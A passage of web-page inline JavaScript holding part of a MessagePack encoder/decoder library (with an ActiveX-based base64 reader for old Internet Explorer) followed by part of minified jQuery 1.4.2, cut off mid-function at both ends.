var binary_to_js_array_base64=function(binary){var chr2index={};var text;(function(){var xmldom=new ActiveXObject("Microsoft.XMLDOM");var bin=xmldom.createElement("bin");bin.dataType="bin.base64";bin.nodeTypedValue=binary;text=bin.text.replace(/[^A-Za-z0-9\+\/\=]/g,"");var b64map="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";for(var i=0,length=b64map.length;i<length;i++){chr2index[b64map.charAt(i)]=i;}})();var chr2,chr3,prev_i=0;return function(start,length){var bytes,last_pos=Math.floor(3*prev_i/4);switch(last_pos-start){case 2:bytes=[chr2,chr3];break;case 1:bytes=[chr3];break;default:bytes=[];}
var j=bytes.length;if(length<=j){bytes.length=length;return bytes;}
var i=prev_i,enc1,enc2,enc3,enc4,last=4*Math.ceil((start+length)/3);while(i<last){enc1=chr2index[text.charAt(i++)];enc2=chr2index[text.charAt(i++)];enc3=chr2index[text.charAt(i++)];enc4=chr2index[text.charAt(i++)];bytes[j++]=(enc1<<2)|(enc2>>4);bytes[j++]=((enc2&0x0f)<<4)|(enc3>>2);bytes[j++]=((enc3&0x03)<<6)|enc4;}
prev_i=i;chr2=bytes[j-2];chr3=bytes[j-1];bytes.length=length;return bytes;}}
var binary_to_js_array_vbs=function(data){msgpack_set_binary_data(data);return function(position,length){return msgpack_substr(position,length).toArray();}};var bytes_substr=binary_to_js_array_base64(data);this.read=function(length){var j=this.index,i=0;if(j+length<=this.length){return bytes_substr(j,length);}else{throw new Error("MessagePackFailure: index is out of range");}}
this.getc=function(){var j=this.index;if(j<this.length){return bytes_substr(j,1)[0];}else{throw new Error("MessagePackFailure: index is out of range");}}}
p.read=function(length){var j=this.index;if(j+length<=this.length){var bytes=new Array(length);for(var i=length-1;i>=0;--i){bytes[i]=this.data.charCodeAt(j+i)&0xff;}
return bytes;}else{throw new Error("MessagePackFailure: index is out of range");}}
p.getc=function(){var j=this.index;if(j<this.length){return this.data.charCodeAt(j);}
else{throw new Error("MessagePackFailure: index is out of range");}}}
MessagePack.pack=function(data){var enc=new MessagePack.Encoder(data);return enc.pack(data);}
MessagePack.Encoder=function(data,charSet){}
with({p:MessagePack.Encoder.prototype}){p.pack=function(value){var type=typeof(value);if(type=="string"){return this.pack_string(value);}
else if(type=="number"){if(Math.floor(value)===value){return this.pack_integer(value);}
else{return this.pack_double(value);}}
else if(type=="boolean"){if(value===true){return"\xc3";}
else if(value===false){return"\xc2";}}
else if(type=="object"){if(value===null){return"\xc0";}
var constructor=value.constructor;if(constructor==Array){return this.pack_array(value);}
else if(constructor==Object){return this.pack_object(value);}
else{throw new Error("not yet supported")}}}
p.pack_string=function(str){var length=str.length;if(length<=0x1f){return this.pack_uint8(0xa0+length)+str;}
else if(length<=0xffff){return"\xda"+this.pack_uint16(length)+str;}
else if(length<=0xffffffff){return"\xdb"+this.pack_uint32(length)+str;}
else{throw new Error("invalid length");}}
p.pack_array=function(ary){var length=ary.length;var str;if(length<=0x0f){str=this.pack_uint8(0x90+length);}
else if(length<=0xffff){str="\xdc"+this.pack_uint16(length);}
else if(length<=0xffffffff){str="\xdd"+this.pack_uint32(length);}
else{throw new Error("invalid length");}
var elems=[];for(var i=0;i<length;i++){elems.push(this.pack(ary[i]));}
return str+elems.join("");}
p.pack_integer=function(num){if(-0x20<=num&&num<=0x7f){return String.fromCharCode(num&0xff);}
else if(0x00<=num&&num<=0xff){return"\xcc"+this.pack_uint8(num);}
else if(-0x80<=num&&num<=0x7f){return"\xd0"+this.pack_int8(num);}
else if(0x0000<=num&&num<=0xffff){return"\xcd"+this.pack_uint16(num);}
else if(-0x8000<=num&&num<=0x7fff){return"\xd1"+this.pack_int16(num);}
else if(0x00000000<=num&&num<=0xffffffff){return"\xce"+this.pack_uint32(num);}
else if(-0x80000000<=num&&num<=0x7fffffff){return"\xd2"+this.pack_int32(num);}
else if(-0x8000000000000000<=num&&num<=0x7FFFFFFFFFFFFFFF){return"\xd3"+this.pack_int64(num);}
else if(0x0000000000000000<=num&&num<=0xFFFFFFFFFFFFFFFF){return"\xcf"+this.pack_uint64(num);}
else{throw new Error("invalid integer");}}
p.pack_double=function(num){var sign=0;if(num<0){sign=1;num=-num;}
var exp=Math.floor(Math.log(num)/Math.LN2);var frac0=num/Math.pow(2,exp)-1;var frac1=Math.floor(frac0*Math.pow(2,52));var b32=Math.pow(2,32);var h32=(sign<<31)|((exp+1023)<<20)|(frac1/b32)&0x0fffff;var l32=frac1%b32;return"\xcb"+this.pack_int32(h32)+this.pack_int32(l32);}
p.pack_object=function(obj){var str="";var length=0;var ary=[];for(var prop in obj){if(obj.hasOwnProperty(prop)){length++;ary.push(this.pack(prop));ary.push(this.pack(obj[prop]));}}
if(length<=0x0f){return this.pack_uint8(0x80+length)+ary.join("");}
else if(length<=0xffff){return"\xde"+this.pack_uint16(length)+ary.join("");}
else if(length<=0xffffffff){return"\xdf"+this.pack_uint32(length)+ary.join("");}
else{throw new Error("invalid length");}}
p.pack_uint8=function(num){return String.fromCharCode(num);}
p.pack_uint16=function(num){return String.fromCharCode(num>>8,num&0xff);}
p.pack_uint32=function(num){var n=num&0xffffffff;return String.fromCharCode((n&0xff000000)>>>24,(n&0x00ff0000)>>>16,(n&0x0000ff00)>>>8,(n&0x000000ff));}
p.pack_uint64=function(num){var high=num/Math.pow(2,32);var low=num%Math.pow(2,32);return String.fromCharCode((high&0xff000000)>>>24,(high&0x00ff0000)>>>16,(high&0x0000ff00)>>>8,(high&0x000000ff),(low&0xff000000)>>>24,(low&0x00ff0000)>>>16,(low&0x0000ff00)>>>8,(low&0x000000ff));}
p.pack_int8=function(num){return String.fromCharCode(num&0xff);}
p.pack_int16=function(num){return String.fromCharCode((num&0xff00)>>8,num&0xff);}
p.pack_int32=function(num){return String.fromCharCode((num>>>24)&0xff,(num&0x00ff0000)>>>16,(num&0x0000ff00)>>>8,(num&0x000000ff));}
p.pack_int64=function(num){var high=Math.floor(num/Math.pow(2,32));var low=num%Math.pow(2,32);return String.fromCharCode((high&0xff000000)>>>24,(high&0x00ff0000)>>>16,(high&0x0000ff00)>>>8,(high&0x000000ff),(low&0xff000000)>>>24,(low&0x00ff0000)>>>16,(low&0x0000ff00)>>>8,(low&0x000000ff));}}</script>
    <script type="text/javascript">
(function(A,w){function ma(){if(!c.isReady){try{s.documentElement.doScroll("left")}catch(a){setTimeout(ma,1);return}c.ready()}}function Qa(a,b){b.src?c.ajax({url:b.src,async:false,dataType:"script"}):c.globalEval(b.text||b.textContent||b.innerHTML||"");b.parentNode&&b.parentNode.removeChild(b)}function X(a,b,d,f,e,j){var i=a.length;if(typeof b==="object"){for(var o in b)X(a,o,b[o],f,e,d);return a}if(d!==w){f=!j&&f&&c.isFunction(d);for(o=0;o<i;o++)e(a[o],b,f?d.call(a[o],o,e(a[o],b)):d,j);return a}return i?e(a[0],b):w}function J(){return(new Date).getTime()}function Y(){return false}function Z(){return true}function na(a,b,d){d[0].type=a;return c.event.handle.apply(b,d)}function oa(a){var b,d=[],f=[],e=arguments,j,i,o,k,n,r;i=c.data(this,"events");if(!(a.liveFired===this||!i||!i.live||a.button&&a.type==="click")){a.liveFired=this;var u=i.live.slice(0);for(k=0;k<u.length;k++){i=u[k];i.origType.replace(O,"")===a.type?f.push(i.selector):u.splice(k--,1)}j=c(a.target).closest(f,a.currentTarget);n=0;for(r=j.length;n<r;n++)for(k=0;k<u.length;k++){i=u[k];if(j[n].selector===i.selector){o=j[n].elem;f=null;if(i.preType==="mouseenter"||i.preType==="mouseleave")f=c(a.relatedTarget).closest(i.selector)[0];if(!f||f!==o)d.push({elem:o,handleObj:i})}}n=0;for(r=d.length;n<r;n++){j=d[n];a.currentTarget=j.elem;a.data=j.handleObj.data;a.handleObj=j.handleObj;if(j.handleObj.origHandler.apply(j.elem,e)===false){b=false;break}}return b}}function pa(a,b){return"live."+(a&&a!=="*"?a+".":"")+b.replace(/\./g,"`").replace(/ /g,"&")}function qa(a){return!a||!a.parentNode||a.parentNode.nodeType===11}function ra(a,b){var d=0;b.each(function(){if(this.nodeName===(a[d]&&a[d].nodeName)){var f=c.data(a[d++]),e=c.data(this,f);if(f=f&&f.events){delete e.handle;e.events={};for(var j in f)for(var i in f[j])c.event.add(this,j,f[j][i],f[j][i].data)}}})}function sa(a,b,d){var f,e,j;b=b&&b[0]?b[0].ownerDocument||b[0]:s;if(a.length===1&&typeof a[0]==="string"&&a[0].length<512&&b===s&&!ta.test(a[0])&&(c.support.checkClone||!ua.test(a[0]))){e=true;if(j=c.fragments[a[0]])if(j!==1)f=j}if(!f){f=b.createDocumentFragment();c.clean(a,b,f,d)}if(e)c.fragments[a[0]]=j?f:1;return{fragment:f,cacheable:e}}function K(a,b){var d={};c.each(va.concat.apply([],va.slice(0,b)),function(){d[this]=a});return d}function wa(a){return"scrollTo"in a&&a.document?a:a.nodeType===9?a.defaultView||a.parentWindow:false}var c=function(a,b){return new c.fn.init(a,b)},Ra=A.jQuery,Sa=A.$,s=A.document,T,Ta=/^[^<]*(<[\w\W]+>)[^>]*$|^#([\w-]+)$/,Ua=/^.[^:#\[\.,]*$/,Va=/\S/,Wa=/^(\s|\u00A0)+|(\s|\u00A0)+$/g,Xa=/^<(\w+)\s*\/?>(?:<\/\1>)?$/,P=navigator.userAgent,xa=false,Q=[],L,$=Object.prototype.toString,aa=Object.prototype.hasOwnProperty,ba=Array.prototype.push,R=Array.prototype.slice,ya=Array.prototype.indexOf;c.fn=c.prototype={init:function(a,b){var d,f;if(!a)return this;if(a.nodeType){this.context=this[0]=a;this.length=1;return this}if(a==="body"&&!b){this.context=s;this[0]=s.body;this.selector="body";this.length=1;return this}if(typeof a==="string")if((d=Ta.exec(a))&&(d[1]||!b))if(d[1]){f=b?b.ownerDocument||b:s;if(a=Xa.exec(a))if(c.isPlainObject(b)){a=[s.createElement(a[1])];c.fn.attr.call(a,b,true)}else a=[f.createElement(a[1])];else{a=sa([d[1]],[f]);a=(a.cacheable?a.fragment.cloneNode(true):a.fragment).childNodes}return c.merge(this,a)}else{if(b=s.getElementById(d[2])){if(b.id!==d[2])return T.find(a);this.length=1;this[0]=b}this.context=s;this.selector=a;return this}else if(!b&&/^\w+$/.test(a)){this.selector=a;this.context=s;a=s.getElementsByTagName(a);return c.merge(this,a)}else return!b||b.jquery?(b||T).find(a):c(b).find(a);else if(c.isFunction(a))return T.ready(a);if(a.selector!==w){this.selector=a.selector;this.context=a.context}return c.makeArray(a,this)},selector:"",jquery:"1.4.2",length:0,size:function(){return this.length},toArray:function(){return R.call(this,0)},get:function(a){return a==null?this.toArray():a<0?this.slice(a)[0]:this[a]},pushStack:function(a,b,d){var f=c();c.isArray(a)?ba.apply(f,a):c.merge(f,a);f.prevObject=this;f.context=this.context;if(b==="find")f.selector=this.selector+(this.selector?" ":"")+d;else if(b)f.selector=this.selector+"."+b+"("+d+")";return f},each:function(a,b){return c.each(this,a,b)},ready:function(a){c.bindReady();if(c.isReady)a.call(s,c);else Q&&Q.push(a);return this},eq:function(a){return a===-1?this.slice(a):this.slice(a,+a+1)},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},slice:function(){return this.pushStack(R.apply(this,arguments),"slice",R.call(arguments).join(","))},map:function(a){return this.pushStack(c.map(this,function(b,d){return a.call(b,d,b)}))},end:function(){return this.prevObject||c(null)},push:ba,sort:[].sort,splice:[].splice};c.fn.init.prototype=c.fn;c.extend=c.fn.extend=function(){var a=arguments[0]||{},b=1,d=arguments.length,f=false,e,j,i,o;if(typeof a==="boolean"){f=a;a=arguments[1]||{};b=2}if(typeof a!=="object"&&!c.isFunction(a))a={};if(d===b){a=this;--b}for(;b<d;b++)if((e=arguments[b])!=null)for(j in e){i=a[j];o=e[j];if(a!==o)if(f&&o&&(c.isPlainObject(o)||c.isArray(o))){i=i&&(c.isPlainObject(i)||c.isArray(i))?i:c.isArray(o)?[]:{};a[j]=c.extend(f,i,o)}else if(o!==w)a[j]=o}return a};c.extend({noConflict:function(a){A.$=Sa;if(a)A.jQuery=Ra;return c},isReady:false,ready:function(){if(!c.isReady){if(!s.body)return setTimeout(c.ready,13);c.isReady=true;if(Q){for(var a,b=0;a=Q[b++];)a.call(s,c);Q=null}c.fn.triggerHandler&&c(s).triggerHandler("ready")}},bindReady:function(){if(!xa){xa=true;if(s.readyState==="complete")return c.ready();if(s.addEventListener){s.addEventListener("DOMContentLoaded",L,false);A.addEventListener("load",c.ready,false)}else if(s.attachEvent){s.attachEvent("onreadystatechange",L);A.attachEvent("onload",c.ready);var a=false;try{a=A.frameElement==null}catch(b){}s.documentElement.doScroll&&a&&ma()}}},isFunction:function(a){return $.call(a)==="[object Function]"},isArray:function(a){return $.call(a)==="[object Array]"},isPlainObject:function(a){if(!a||$.call(a)!=="[object Object]"||a.nodeType||a.setInterval)return false;if(a.constructor&&!aa.call(a,"constructor")&&!aa.call(a.constructor.prototype,"isPrototypeOf"))return false;var b;for(b in a);return b===w||aa.call(a,b)},isEmptyObject:function(a){for(var b in a)return false;return true},error:function(a){throw a;},parseJSON:function(a){if(typeof a!=="string"||!a)return null;a=c.trim(a);if(/^[\],:{}\s]*$/.test(a.replace(/\\(?:["\\\/bfnrt]|u[0-9a-fA-F]{4})/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,"")))return A.JSON&&A.JSON.parse?A.JSON.parse(a):(new Function("return "+
a))();else c.error("Invalid JSON: "+a)},noop:function(){},globalEval:function(a){if(a&&Va.test(a)){var b=s.getElementsByTagName("head")[0]||s.documentElement,d=s.createElement("script");d.type="text/javascript";if(c.support.scriptEval)d.appendChild(s.createTextNode(a));else d.text=a;b.insertBefore(d,b.firstChild);b.removeChild(d)}},nodeName:function(a,b){return a.nodeName&&a.nodeName.toUpperCase()===b.toUpperCase()},each:function(a,b,d){var f,e=0,j=a.length,i=j===w||c.isFunction(a);if(d)if(i)for(f in a){if(b.apply(a[f],d)===false)break}else for(;e<j;){if(b.apply(a[e++],d)===false)break}else if(i)for(f in a){if(b.call(a[f],f,a[f])===false)break}else for(d=a[0];e<j&&b.call(d,e,d)!==false;d=a[++e]);return a},trim:function(a){return(a||"").replace(Wa,"")},makeArray:function(a,b){b=b||[];if(a!=null)a.length==null||typeof a==="string"||c.isFunction(a)||typeof a!=="function"&&a.setInterval?ba.call(b,a):c.merge(b,a);return b},inArray:function(a,b){if(b.indexOf)return b.indexOf(a);for(var d=0,f=b.length;d<f;d++)if(b[d]===a)return d;return-1},merge:function(a,b){var d=a.length,f=0;if(typeof b.length==="number")for(var e=b.length;f<e;f++)a[d++]=b[f];else for(;b[f]!==w;)a[d++]=b[f++];a.length=d;return a},grep:function(a,b,d){for(var f=[],e=0,j=a.length;e<j;e++)!d!==!b(a[e],e)&&f.push(a[e]);return f},map:function(a,b,d){for(var f=[],e,j=0,i=a.length;j<i;j++){e=b(a[j],j,d);if(e!=null)f[f.length]=e}return f.concat.apply([],f)},guid:1,proxy:function(a,b,d){if(arguments.length===2)if(typeof b==="string"){d=a;a=d[b];b=w}else if(b&&!c.isFunction(b)){d=b;b=w}if(!b&&a)b=function(){return a.apply(d||this,arguments)};if(a)b.guid=a.guid=a.guid||b.guid||c.guid++;return b},uaMatch:function(a){a=a.toLowerCase();a=/(webkit)[ \/]([\w.]+)/.exec(a)||/(opera)(?:.*version)?[ \/]([\w.]+)/.exec(a)||/(msie) ([\w.]+)/.exec(a)||!/compatible/.test(a)&&/(mozilla)(?:.*? rv:([\w.]+))?/.exec(a)||[];return{browser:a[1]||"",version:a[2]||"0"}},browser:{}});P=c.uaMatch(P);if(P.browser){c.browser[P.browser]=true;c.browser.version=P.version}if(c.browser.webkit)c.browser.safari=true;if(ya)c.inArray=function(a,b){return ya.call(b,a)};T=c(s);if(s.addEventListener)L=function(){s.removeEventListener("DOMContentLoaded",L,false);c.ready()};else if(s.attachEvent)L=function(){if(s.readyState==="complete"){s.detachEvent("onreadystatechange",L);c.ready()}};(function(){c.support={};var a=s.documentElement,b=s.createElement("script"),d=s.createElement("div"),f="script"+J();d.style.display="none";d.innerHTML="   <link/><table></table><a href='/a' style='color:red;float:left;opacity:.55;'>a</a><input type='checkbox'/>";var e=d.getElementsByTagName("*"),j=d.getElementsByTagName("a")[0];if(!(!e||!e.length||!j)){c.support={leadingWhitespace:d.firstChild.nodeType===3,tbody:!d.getElementsByTagName("tbody").length,htmlSerialize:!!d.getElementsByTagName("link").length,style:/red/.test(j.getAttribute("style")),hrefNormalized:j.getAttribute("href")==="/a",opacity:/^0.55$/.test(j.style.opacity),cssFloat:!!j.style.cssFloat,checkOn:d.getElementsByTagName("input")[0].value==="on",optSelected:s.createElement("select").appendChild(s.createElement("option")).selected,parentNode:d.removeChild(d.appendChild(s.createElement("div"))).parentNode===null,deleteExpando:true,checkClone:false,scriptEval:false,noCloneEvent:true,boxModel:null};b.type="text/javascript";try{b.appendChild(s.createTextNode("window."+f+"=1;"))}catch(i){}a.insertBefore(b,a.firstChild);if(A[f]){c.support.scriptEval=true;delete A[f]}try{delete b.test}catch(o){c.support.deleteExpando=false}a.removeChild(b);if(d.attachEvent&&d.fireEvent){d.attachEvent("onclick",function k(){c.support.noCloneEvent=false;d.detachEvent("onclick",k)});d.cloneNode(true).fireEvent("onclick")}d=s.createElement("div");d.innerHTML="<input type='radio' name='radiotest' checked='checked'/>";a=s.createDocumentFragment();a.appendChild(d.firstChild);c.support.checkClone=a.cloneNode(true).cloneNode(true).lastChild.checked;c(function(){var k=s.createElement("div");k.style.width=k.style.paddingLeft="1px";s.body.appendChild(k);c.boxModel=c.support.boxModel=k.offsetWidth===2;s.body.removeChild(k).style.display="none"});a=function(k){var n=s.createElement("div");k="on"+k;var r=k in n;if(!r){n.setAttribute(k,"return;");r=typeof n[k]==="function"}return r};c.support.submitBubbles=a("submit");c.support.changeBubbles=a("change");a=b=d=e=j=null}})();c.props={"for":"htmlFor","class":"className",readonly:"readOnly",maxlength:"maxLength",cellspacing:"cellSpacing",rowspan:"rowSpan",colspan:"colSpan",tabindex:"tabIndex",usemap:"useMap",frameborder:"frameBorder"};var G="jQuery"+J(),Ya=0,za={};c.extend({cache:{},expando:G,noData:{embed:true,object:true,applet:true},data:function(a,b,d){if(!(a.nodeName&&c.noData[a.nodeName.toLowerCase()])){a=a==A?za:a;var f=a[G],e=c.cache;if(!f&&typeof b==="string"&&d===w)return null;f||(f=++Ya);if(typeof b==="object"){a[G]=f;e[f]=c.extend(true,{},b)}else if(!e[f]){a[G]=f;e[f]={}}a=e[f];if(d!==w)a[b]=d;return typeof b==="string"?a[b]:a}},removeData:function(a,b){if(!(a.nodeName&&c.noData[a.nodeName.toLowerCase()])){a=a==A?za:a;var d=a[G],f=c.cache,e=f[d];if(b){if(e){delete e[b];c.isEmptyObject(e)&&c.removeData(a)}}else{if(c.support.deleteExpando)delete a[c.expando];else a.removeAttribute&&a.removeAttribute(c.expando);delete f[d]}}}});c.fn.extend({data:function(a,b){if(typeof a==="undefined"&&this.length)return c.data(this[0]);else if(typeof a==="object")return this.each(function(){c.data(this,a)});var d=a.split(".");d[1]=d[1]?"."+d[1]:"";if(b===w){var f=this.triggerHandler("getData"+d[1]+"!",[d[0]]);if(f===w&&this.length)f=c.data(this[0],a);return f===w&&d[1]?this.data(d[0]):f}else return this.trigger("setData"+d[1]+"!",[d[0],b]).each(function(){c.data(this,a,b)})},removeData:function(a){return this.each(function(){c.removeData(this,a)})}});c.extend({queue:function(a,b,d){if(a){b=(b||"fx")+"queue";var f=c.data(a,b);if(!d)return f||[];if(!f||c.isArray(d))f=c.data(a,b,c.makeArray(d));else f.push(d);return f}},dequeue:function(a,b){b=b||"fx";var d=c.queue(a,b),f=d.shift();if(f==="inprogress")f=d.shift();if(f){b==="fx"&&d.unshift("inprogress");f.call(a,function(){c.dequeue(a,b)})}}});c.fn.extend({queue:function(a,b){if(typeof a!=="string"){b=a;a="fx"}if(b===w)return c.queue(this[0],a);return this.each(function(){var d=c.queue(this,a,b);a==="fx"&&d[0]!=="inprogress"&&c.dequeue(this,a)})},dequeue:function(a){return this.each(function(){c.dequeue(this,a)})},delay:function(a,b){a=c.fx?c.fx.speeds[a]||a:a;b=b||"fx";return this.queue(b,function(){var d=this;setTimeout(function(){c.dequeue(d,b)},a)})},clearQueue:function(a){return this.queue(a||"fx",[])}});var Aa=/[\n\t]/g,ca=/\s+/,Za=/\r/g,$a=/href|src|style/,ab=/(button|input)/i,bb=/(button|input|object|select|textarea)/i,cb=/^(a|area)$/i,Ba=/radio|checkbox/;c.fn.extend({attr:function(a,b){return X(this,a,b,true,c.attr)},removeAttr:function(a){return this.each(function(){c.attr(this,a,"");this.nodeType===1&&this.removeAttribute(a)})},addClass:function(a){if(c.isFunction(a))return this.each(function(n){var r=c(this);r.addClass(a.call(this,n,r.attr("class")))});if(a&&typeof a==="string")for(var b=(a||"").split(ca),d=0,f=this.length;d<f;d++){var e=this[d];if(e.nodeType===1)if(e.className){for(var j=" "+e.className+" ",i=e.className,o=0,k=b.length;o<k;o++)if(j.indexOf(" "+b[o]+" ")<0)i+=" "+b[o];e.className=c.trim(i)}else e.className=a}return this},removeClass:function(a){if(c.isFunction(a))return this.each(function(k){var n=c(this);n.removeClass(a.call(this,k,n.attr("class")))});if(a&&typeof a==="string"||a===w)for(var b=(a||"").split(ca),d=0,f=this.length;d<f;d++){var e=this[d];if(e.nodeType===1&&e.className)if(a){for(var j=(" "+e.className+" ").replace(Aa," "),i=0,o=b.length;i<o;i++)j=j.replace(" "+b[i]+" "," ");e.className=c.trim(j)}else e.className=""}return this},toggleClass:function(a,b){var d=typeof a,f=typeof b==="boolean";if(c.isFunction(a))return this.each(function(e){var j=c(this);j.toggleClass(a.call(this,e,j.attr("class"),b),b)});return this.each(function(){if(d==="string")for(var e,j=0,i=c(this),o=b,k=a.split(ca);e=k[j++];){o=f?o:!i.hasClass(e);i[o?"addClass":"removeClass"](e)}else if(d==="undefined"||d==="boolean"){this.className&&c.data(this,"__className__",this.className);this.className=this.className||a===false?"":c.data(this,"__className__")||""}})},hasClass:function(a){a=" "+a+" ";for(var b=0,d=this.length;b<d;b++)if((" "+this[b].className+" ").replace(Aa," ").indexOf(a)>-1)return true;return false},val:function(a){if(a===w){var b=this[0];if(b){if(c.nodeName(b,"option"))return(b.attributes.value||{}).specified?b.value:b.text;if(c.nodeName(b,"select")){var d=b.selectedIndex,f=[],e=b.options;b=b.type==="select-one";if(d<0)return null;var j=b?d:0;for(d=b?d+1:e.length;j<d;j++){var i=e[j];if(i.selected){a=c(i).val();if(b)return a;f.push(a)}}return f}if(Ba.test(b.type)&&!c.support.checkOn)return b.getAttribute("value")===null?"on":b.value;return(b.value||"").replace(Za,"")}return w}var o=c.isFunction(a);return this.each(function(k){var n=c(this),r=a;if(this.nodeType===1){if(o)r=a.call(this,k,n.val());if(typeof r==="number")r+="";if(c.isArray(r)&&Ba.test(this.type))this.checked=c.inArray(n.val(),r)>=0;else if(c.nodeName(this,"select")){var u=c.makeArray(r);c("option",this).each(function(){this.selected=c.inArray(c(this).val(),u)>=0});if(!u.length)this.selectedIndex=-1}else this.value=r}})}});c.extend({attrFn:{val:true,css:true,html:true,text:true,data:true,width:true,height:true,offset:true},attr:function(a,b,d,f){if(!a||a.nodeType===3||a.nodeType===8)return w;if(f&&b in c.attrFn)return c(a)[b](d);f=a.nodeType!==1||!c.isXMLDoc(a);var e=d!==w;b=f&&c.props[b]||b;if(a.nodeType===1){var j=$a.test(b);if(b in a&&f&&!j){if(e){b==="type"&&ab.test(a.nodeName)&&a.parentNode&&c.error("type property can't be changed");a[b]=d}if(c.nodeName(a,"form")&&a.getAttributeNode(b))return a.getAttributeNode(b).nodeValue;if(b==="tabIndex")return(b=a.getAttributeNode("tabIndex"))&&b.specified?b.value:bb.test(a.nodeName)||cb.test(a.nodeName)&&a.href?0:w;return a[b]}if(!c.support.style&&f&&b==="style"){if(e)a.style.cssText=""+d;return a.style.cssText}e&&a.setAttribute(b,""+d);a=!c.support.hrefNormalized&&f&&j?a.getAttribute(b,2):a.getAttribute(b);return a===null?w:a}return c.style(a,b,d)}});var O=/\.(.*)$/,db=function(a){return a.replace(/[^\w\s\.\|`]/g,function(b){return"\\"+b})};c.event={add:function(a,b,d,f){if(!(a.nodeType===3||a.nodeType===8)){if(a.setInterval&&a!==A&&!a.frameElement)a=A;var e,j;if(d.handler){e=d;d=e.handler}if(!d.guid)d.guid=c.guid++;if(j=c.data(a)){var i=j.events=j.events||{},o=j.handle;if(!o)j.handle=o=function(){return typeof c!=="undefined"&&!c.event.triggered?c.event.handle.apply(o.elem,arguments):w};o.elem=a;b=b.split(" ");for(var k,n=0,r;k=b[n++];){j=e?c.extend({},e):{handler:d,data:f};if(k.indexOf(".")>-1){r=k.split(".");k=r.shift();j.namespace=r.slice(0).sort().join(".")}else{r=[];j.namespace=""}j.type=k;j.guid=d.guid;var u=i[k],z=c.event.special[k]||{};if(!u){u=i[k]=[];if(!z.setup||z.setup.call(a,f,r,o)===false)if(a.addEventListener)a.addEventListener(k,o,false);else a.attachEvent&&a.attachEvent("on"+k,o)}if(z.add){z.add.call(a,j);if(!j.handler.guid)j.handler.guid=d.guid}u.push(j);c.event.global[k]=true}a=null}}},global:{},remove:function(a,b,d,f){if(!(a.nodeType===3||a.nodeType===8)){var e,j=0,i,o,k,n,r,u,z=c.data(a),C=z&&z.events;if(z&&C){if(b&&b.type){d=b.handler;b=b.type}if(!b||typeof b==="string"&&b.charAt(0)==="."){b=b||"";for(e in C)c.event.remove(a,e+b)}else{for(b=b.split(" ");e=b[j++];){n=e;i=e.indexOf(".")<0;o=[];if(!i){o=e.split(".");e=o.shift();k=new RegExp("(^|\\.)"+c.map(o.slice(0).sort(),db).join("\\.(?:.*\\.)?")+"(\\.|$)")}if(r=C[e])if(d){n=c.event.special[e]||{};for(B=f||0;B<r.length;B++){u=r[B];if(d.guid===u.guid){if(i||k.test(u.namespace)){f==null&&r.splice(B--,1);n.remove&&n.remove.call(a,u)}if(f!=null)break}}if(r.length===0||f!=null&&r.length===1){if(!n.teardown||n.teardown.call(a,o)===false)Ca(a,e,z.handle);delete C[e]}}else for(var B=0;B<r.length;B++){u=r[B];if(i||k.test(u.namespace)){c.event.remove(a,n,u.handler,B);r.splice(B--,1)}}}if(c.isEmptyObject(C)){if(b=z.handle)b.elem=null;delete z.events;delete z.handle;c.isEmptyObject(z)&&c.removeData(a)}}}}},trigger:function(a,b,d,f){var e=a.type||a;if(!f){a=typeof a==="object"?a[G]?a:c.extend(c.Event(e),a):c.Event(e);if(e.indexOf("!")>=0){a.type=e=e.slice(0,-1);a.exclusive=true}if(!d){a.stopPropagation();c.event.global[e]&&c.each(c.cache,function(){this.events&&this.events[e]&&c.event.trigger(a,b,this.handle.elem)})}if(!d||d.nodeType===3||d.nodeType===8)return w;a.result=w;a.target=d;b=c.makeArray(b);b.unshift(a)}a.currentTarget=d;(f=c.data(d,"handle"))&&f.apply(d,b);f=d.parentNode||d.ownerDocument;try{if(!(d&&d.nodeName&&c.noData[d.nodeName.toLowerCase()]))if(d["on"+e]&&d["on"+e].apply(d,b)===false)a.result=false}catch(j){}if(!a.isPropagationStopped()&&f)c.event.trigger(a,b,f,true);else if(!a.isDefaultPrevented()){f=a.target;var i,o=c.nodeName(f,"a")&&e==="click",k=c.event.special[e]||{};if((!k._default||k._default.call(d,a)===false)&&!o&&!(f&&f.nodeName&&c.noData[f.nodeName.toLowerCase()])){try{if(f[e]){if(i=f["on"+e])f["on"+e]=null;c.event.triggered=true;f[e]()}}catch(n){}if(i)f["on"+e]=i;c.event.triggered=false}}},handle:function(a){var b,d,f,e;a=arguments[0]=c.event.fix(a||A.event);a.currentTarget=this;b=a.type.indexOf(".")<0&&!a.exclusive;if(!b){d=a.type.split(".");a.type=d.shift();f=new RegExp("(^|\\.)"+d.slice(0).sort().join("\\.(?:.*\\.)?")+"(\\.|$)")}e=c.data(this,"events");d=e[a.type];if(e&&d){d=d.slice(0);e=0;for(var j=d.length;e<j;e++){var i=d[e];if(b||f.test(i.namespace)){a.handler=i.handler;a.data=i.data;a.handleObj=i;i=i.handler.apply(this,arguments);if(i!==w){a.result=i;if(i===false){a.preventDefault();a.stopPropagation()}}if(a.isImmediatePropagationStopped())break}}}return a.result},props:"altKey attrChange attrName bubbles button cancelable charCode clientX clientY ctrlKey currentTarget data detail eventPhase fromElement handler keyCode layerX layerY metaKey newValue offsetX offsetY originalTarget pageX pageY prevValue relatedNode relatedTarget screenX screenY shiftKey srcElement target toElement view wheelDelta which".split(" "),fix:function(a){if(a[G])return a;var b=a;a=c.Event(b);for(var d=this.props.length,f;d;){f=this.props[--d];a[f]=b[f]}if(!a.target)a.target=a.srcElement||s;if(a.target.nodeType===3)a.target=a.target.parentNode;if(!a.relatedTarget&&a.fromElement)a.relatedTarget=a.fromElement===a.target?a.toElement:a.fromElement;if(a.pageX==null&&a.clientX!=null){b=s.documentElement;d=s.body;a.pageX=a.clientX+(b&&b.scrollLeft||d&&d.scrollLeft||0)-(b&&b.clientLeft||d&&d.clientLeft||0);a.pageY=a.clientY+(b&&b.scrollTop||d&&d.scrollTop||0)-(b&&b.clientTop||d&&d.clientTop||0)}if(!a.which&&(a.charCode||a.charCode===0?a.charCode:a.keyCode))a.which=a.charCode||a.keyCode;if(!a.metaKey&&a.ctrlKey)a.metaKey=a.ctrlKey;if(!a.which&&a.button!==w)a.which=a.button&1?1:a.button&2?3:a.button&4?2:0;return 